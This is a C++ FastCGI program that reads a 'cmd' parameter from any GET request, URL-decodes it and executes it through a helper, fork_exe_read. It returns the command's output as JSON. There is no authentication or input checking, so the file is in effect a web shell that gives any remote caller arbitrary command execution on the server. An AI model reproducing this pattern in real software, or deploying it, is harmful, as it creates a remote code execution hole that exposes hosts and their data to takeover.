#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "fcgi_stdio.h"
#include "fcgi_config.h"

#include "urlparse.h"
#include "json/json.h"

#include "pipe.h"

using namespace std;

extern char **environ;

int main()
{
  int rc;
  
  FCGX_Init();
  pid_t pid = getpid();
  FCGX_Request request;
  char *server_name;

  FCGX_InitRequest(&request, 0, 0);

  for (;;) {
    rc = FCGX_Accept_r(&request);
    
    if (rc < 0)
      continue;

    FCGX_FPrintF(request.out, "Content-type:application/json\r\n\r\n");		     

    string uri(FCGX_GetParam("REQUEST_URI", request.envp));
    string method(FCGX_GetParam("REQUEST_METHOD", request.envp));
    string response;
    vector<kv> params = split_param(get_param(uri));
    Json::Value root;
    Json::Value data;
    Json::FastWriter fastwriter;
    
    root["REQUEST_URI"] = uri;
    root["REQUEST_METHOD"] = method;
    if (method == "GET") {
      for (vector<kv>::iterator iter = params.begin();
	   iter != params.end();
	   iter++) {
	if (iter->first == "cmd") {
	  response = fork_exe_read(decodeURIComponent(iter->second));
	  root["DATA"] = response;
	}
	data[iter->first] = iter->second;
      }
    }
    
    string jsonstr = fastwriter.write(data);
    string jsonstring = fastwriter.write(root);
    FCGX_FPrintF(request.out, "%s", jsonstring.c_str());

    FCGX_Finish_r(&request);
  }
  
  return 0;
}
